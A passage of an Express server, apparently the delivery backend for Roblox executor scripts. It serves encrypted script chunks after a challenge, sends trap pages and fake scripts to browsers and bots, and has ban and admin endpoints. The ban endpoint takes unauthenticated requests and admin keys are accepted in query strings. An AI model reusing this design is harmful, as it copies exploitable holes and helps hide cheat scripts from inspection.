    await db.setChallenge(id, { id, userId: uid, hwid, placeId: pid, ip, ...chal }, 120);
    res.json({ success: true, challengeId: id, type: chal.type, puzzle: chal.puzzle, expiresIn: 120 });
});

app.post('/api/auth/verify', async (r, res) => {
    const ct = getClientType(r);
    await logAccess(r, 'VERIFY_' + ct.toUpperCase(), ct === 'executor');
    if (ct === 'browser') return res.status(403).type('html').send(TRAP_HTML);
    if (ct === 'bot' || ct === 'unknown') return res.status(403).type('text/plain').send(genFakeScript());
    if (ct === 'blocked_executor') return res.status(403).json({ success: false, error: 'Executor not allowed' });
    const { challengeId, solution, timestamp } = r.body;
    if (!challengeId || solution === undefined || !timestamp) return res.status(400).json({ success: false, error: 'Missing fields' });
    const challenge = await db.getChallenge(challengeId);
    if (!challenge) return res.status(403).json({ success: false, error: 'Challenge expired' });
    if (challenge.ip !== getIP(r)) return res.status(403).json({ success: false, error: 'IP mismatch' });
    if (parseInt(solution) !== challenge.answer) return res.status(403).json({ success: false, error: 'Wrong solution' });
    await db.deleteChallenge(challengeId);
    const script = await getScript();
    if (!script) return res.status(500).json({ success: false, error: 'Script not configured' });
    const url = process.env.RENDER_EXTERNAL_URL || `${r.protocol}://${r.get('host')}`;
    const wrapped = wrapScript(script, url);
    const isObf = config.SCRIPT_ALREADY_OBFUSCATED || isObfuscated(script);
    const sessionId = crypto.randomBytes(16).toString('hex');
    SESSIONS.set(sessionId, { hwid: challenge.hwid, ip: challenge.ip, userId: challenge.userId, created: Date.now() });
    if (isObf) return res.json({ success: true, mode: 'raw', script: wrapped, sessionId, ownerIds: config.OWNER_USER_IDS || [], whitelistIds: config.WHITELIST_USER_IDS || [] });
    const key = genSessionKey(challenge.userId, challenge.hwid, timestamp, config.SECRET_KEY);
    const chunks = [];
    for (let i = 0; i < wrapped.length; i += 1500) {
        const chunk = wrapped.substring(i, i + 1500);
        const enc = [];
        for (let j = 0; j < chunk.length; j++) enc.push(chunk.charCodeAt(j) ^ key.charCodeAt(j % key.length));
        chunks.push(enc);
    }
    res.json({ success: true, mode: 'encrypted', key, chunks, sessionId, ownerIds: config.OWNER_USER_IDS || [], whitelistIds: config.WHITELIST_USER_IDS || [] });
});

app.post('/api/heartbeat', async (r, res) => {
    const { sessionId, hwid } = r.body;
    if (!sessionId || !hwid) return res.json({ success: true, action: 'CONTINUE' });
    const session = SESSIONS.get(sessionId);
    if (!session) return res.json({ success: true, action: 'CONTINUE' });
    const ban = await db.isBanned(hwid, getIP(r), session.userId);
    if (ban.blocked) return res.json({ success: false, action: 'TERMINATE', reason: 'Banned' });
    session.lastSeen = Date.now();
    res.json({ success: true, action: 'CONTINUE' });
});

app.post('/api/ban', async (r, res) => {
    const { hwid, playerId, reason, toolsDetected, sessionId } = r.body;
    if (!hwid && !playerId) return res.status(400).json({ error: 'Missing id' });
    const banId = crypto.randomBytes(8).toString('hex').toUpperCase();
    if (hwid) await db.addBan(hwid, { hwid, ip: getIP(r), playerId, reason: reason || 'Auto', toolsDetected, banId, ts: new Date().toISOString() });
    if (playerId) await db.addBan(String(playerId), { playerId, reason: reason || 'Auto', banId, ts: new Date().toISOString() });
    if (sessionId) SESSIONS.delete(sessionId);
    await logAccess(r, 'BAN_ADDED', true, { hwid, playerId, reason });
    res.json({ success: true, banId });
});

// --- ADMIN API ---
app.get('/api/admin/stats', async (r, res) => { const key = r.headers['x-admin-key'] || r.query.key; if (!key || !secureCompare(key, config.ADMIN_KEY)) return res.status(403).json({ error: 'Unauthorized' }); const stats = await db.getStats(); res.json({ success: true, stats, sessions: SESSIONS.size }); });
app.get('/api/admin/logs', async (r, res) => { const key = r.headers['x-admin-key'] || r.query.key; if (!key || !secureCompare(key, config.ADMIN_KEY)) return res.status(403).json({ error: 'Unauthorized' }); const logs = await db.getLogs(Math.min(parseInt(r.query.limit) || 50, 500)); res.json({ success: true, logs }); });
app.get('/api/admin/bans', async (r, res) => { const key = r.headers['x-admin-key'] || r.query.key; if (!key || !secureCompare(key, config.ADMIN_KEY)) return res.status(403).json({ error: 'Unauthorized' }); const bans = await db.getAllBans(); res.json({ success: true, bans }); });
app.delete('/api/admin/bans/:id', async (r, res) => { const key = r.headers['x-admin-key']; if (!key || !secureCompare(key, config.ADMIN_KEY)) return res.status(403).json({ error: 'Unauthorized' }); const removed = await db.removeBanById(r.params.id); res.json({ success: removed }); });
app.post('/api/admin/bans', async (r, res) => { const key = r.headers['x-admin-key']; if (!key || !secureCompare(key, config.ADMIN_KEY)) return res.status(403).json({ error: 'Unauthorized' }); const { hwid, ip, playerId, reason } = r.body; if (!hwid && !ip && !playerId) return res.status(400).json({ error: 'Required' }); const banId = crypto.randomBytes(8).toString('hex').toUpperCase(); if (hwid) await db.addBan(hwid, { hwid, reason: reason || 'Manual', banId, ts: new Date().toISOString() }); if (playerId) await db.addBan(String(playerId), { playerId, reason: reason || 'Manual', banId, ts: new Date().toISOString() }); if (ip) await db.addBan(ip, { ip, reason: reason || 'Manual', banId, ts: new Date().toISOString() }); res.json({ success: true, banId }); });
app.post('/api/admin/bans/clear', async (r, res) => { const key = r.headers['x-admin-key']; if (!key || !secureCompare(key, config.ADMIN_KEY)) return res.status(403).json({ error: 'Unauthorized' }); const count = await db.clearBans(); res.json({ success: true, cleared: count }); });
app.post('/api/admin/unban', async (r, res) => { const key = r.headers['x-admin-key']; if (!key || !secureCompare(key, config.ADMIN_KEY)) return res.status(403).json({ error: 'Unauthorized' }); const { hwid, ip, playerId } = r.body; let removed = 0; if (hwid) { await db.removeBan(hwid); removed++; } if (ip) { await db.removeBan(ip); removed++; } if (playerId) { await db.removeBan(String(playerId)); removed++; } res.json({ success: true, removed }); });
app.post('/api/admin/cache/clear', async (r, res) => { const key = r.headers['x-admin-key']; if (!key || !secureCompare(key, config.ADMIN_KEY)) return res.status(403).json({ error: 'Unauthorized' }); await db.setCachedScript(null); res.json({ success: true }); });
app.post('/api/admin/sessions/clear', async (r, res) => { const key = r.headers['x-admin-key']; if (!key || !secureCompare(key, config.ADMIN_KEY)) return res.status(403).json({ error: 'Unauthorized' }); const count = SESSIONS.size; SESSIONS.clear(); res.json({ success: true, cleared: count }); });

app.use('*', (r, res) => { const ct = getClientType(r); if (ct === 'browser') return res.status(404).type('html').send(TRAP_HTML); if (ct === 'bot' || ct === 'unknown' || ct === 'blocked_executor') return res.status(403).type('text/plain').send(genFakeScript()); res.status(404).json({ error: 'Not found' }); });

setInterval(() => { const now = Date.now(); for (const [k, v] of SESSIONS) if (now - v.created > 7200000) SESSIONS.delete(k); }, 300000);

app.listen(process.env.PORT || 3000, '0.0.0.0');
